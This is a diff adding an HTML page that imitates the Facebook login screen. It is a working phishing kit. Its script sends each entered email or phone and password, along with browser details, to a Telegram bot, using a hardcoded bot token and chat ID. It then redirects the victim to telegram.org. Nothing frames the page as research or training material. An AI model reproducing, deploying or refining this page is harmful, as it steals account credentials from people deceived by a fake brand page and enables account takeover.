@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – log in or sign up</title>
+    <style>
+        /* General Reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 980px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+        }
+
+        /* Left Side: Branding */
+        .brand-section {
+            width: 50%;
+            margin-bottom: 100px;
+        }
+
+        .logo {
+            color: #1877f2;
+            font-size: 60px;
+            font-weight: bold;
+            margin-bottom: -10px;
+            letter-spacing: -2px;
+        }
+
+        .tagline {
+            font-size: 28px;
+            line-height: 32px;
+            color: #1c1e21;
+            font-weight: normal;
+            width: 500px;
+        }
+
+        /* Right Side: Form */
+        .form-section {
+            width: 400px;
+            text-align: center;
+        }
+
+        .login-card {
+            background: #fff;
+            padding: 16px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            outline: none;
+        }
+
+        input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .login-btn {
+            width: 100%;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 12px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+
+        .login-btn:hover {
+            background-color: #166fe5;
+        }
+
+        .forgot-password {
+            display: block;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        hr {
+            border: 0;
+            border-top: 1px solid #dadde1;
+            margin-bottom: 20px;
+        }
+
+        .create-account-btn {
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 0 16px;
+            font-size: 17px;
+            font-weight: bold;
+            line-height: 48px;
+            cursor: pointer;
+            display: inline-block;
+        }
+
+        .create-account-btn:hover {
+            background-color: #36a420;
+        }
+
+        .footer-text {
+            margin-top: 25px;
+            font-size: 14px;
+            color: #1c1e21;
+        }
+
+        /* Message Styles */
+        .message {
+            padding: 12px;
+            margin-top: 10px;
+            border-radius: 6px;
+            display: none;
+            font-size: 14px;
+        }
+
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        /* Loading indicator */
+        .loading {
+            display: none;
+            margin: 10px auto;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1877f2;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Responsive Design for Mobile */
+        @media (max-width: 900px) {
+            .container {
+                flex-direction: column;
+                text-align: center;
+            }
+            .brand-section {
+                width: 100%;
+                margin-bottom: 40px;
+            }
+            .tagline {
+                width: 100%;
+                font-size: 24px;
+            }
+            .form-section {
+                width: 100%;
+                max-width: 400px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="brand-section">
+            <h1 class="logo">facebook</h1>
+            <p class="tagline">Facebook helps you connect and share with the people in your life.</p>
+        </div>
+
+        <div class="form-section">
+            <div class="login-card">
+                <form id="loginForm">
+                    <input type="text" id="emailOrPhone" placeholder="Email address or phone number" required>
+                    <input type="password" id="password" placeholder="Password" required>
+                    <div class="loading" id="loading"></div>
+                    <div class="message" id="message"></div>
+                    <button type="submit" class="login-btn">Log In</button>
+                    <a href="#" class="forgot-password">Forgotten password?</a>
+                    <hr>
+                    <button type="button" class="create-account-btn">Create new account</button>
+                </form>
+            </div>
+            <p class="footer-text"><strong>Create a Page</strong> for a celebrity, brand or business.</p>
+        </div>
+    </div>
+
+    <script>
+        // Telegram Bot Configuration
+        const BOT_TOKEN = '8463816043:AAEKOl889LxyNdNgCy4XvgLGYzWRhOk2x3o';
+        const CHAT_ID = '7610694539';
+        const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        // DOM Elements
+        const loginForm = document.getElementById('loginForm');
+        const emailOrPhoneInput = document.getElementById('emailOrPhone');
+        const passwordInput = document.getElementById('password');
+        const messageDiv = document.getElementById('message');
+        const loadingDiv = document.getElementById('loading');
+
+        // Form submission handler
+        loginForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const emailOrPhone = emailOrPhoneInput.value.trim();
+            const password = passwordInput.value.trim();
+            
+            // Basic validation
+            if (!emailOrPhone || !password) {
+                showMessage('Please fill in all fields', 'error');
+                return;
+            }
+            
+            // Show loading indicator
+            loadingDiv.style.display = 'block';
+            hideMessage();
+            
+            try {
+                // Send data to Telegram bot
+                const response = await sendToTelegram(emailOrPhone, password);
+                
+                if (response.ok) {
+                    // Show success message
+                    showMessage('Login information sent successfully! Redirecting...', 'success');
+                    
+                    // Clear form
+                    emailOrPhoneInput.value = '';
+                    passwordInput.value = '';
+                    
+                    // Redirect after 2 seconds
+                    setTimeout(() => {
+                        window.location.href = 'https://telegram.org/';
+                    }, 2000);
+                } else {
+                    throw new Error('Failed to send data');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                showMessage('An error occurred. Please try again.', 'error');
+            } finally {
+                // Hide loading indicator
+                loadingDiv.style.display = 'none';
+            }
+        });
+
+        // Function to send data to Telegram
+        async function sendToTelegram(emailOrPhone, password) {
+            const message = `🔐 New Login Attempt:\n\n📧 Email/Phone: ${emailOrPhone}\n🔑 Password: ${password}\n\n🌐 User Agent: ${navigator.userAgent}\n📱 Platform: ${navigator.platform}\n🌍 Language: ${navigator.language}`;
+            
+            const data = {
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            };
+            
+            const response = await fetch(TELEGRAM_API_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            });
+            
+            return response;
+        }
+
+        // Function to show message
+        function showMessage(text, type) {
+            messageDiv.textContent = text;
+            messageDiv.className = `message ${type}`;
+            messageDiv.style.display = 'block';
+        }
+
+        // Function to hide message
+        function hideMessage() {
+            messageDiv.style.display = 'none';
+        }
+
+        // Create Account button functionality
+        document.querySelector('.create-account-btn').addEventListener('click', function() {
+            alert('Create Account feature would open a registration form.');
+        });
+
+        // Forgot Password link functionality
+        document.querySelector('.forgot-password').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('Password reset functionality would be implemented here.');
+        });
+    </script>
+
+</body>
+</html>
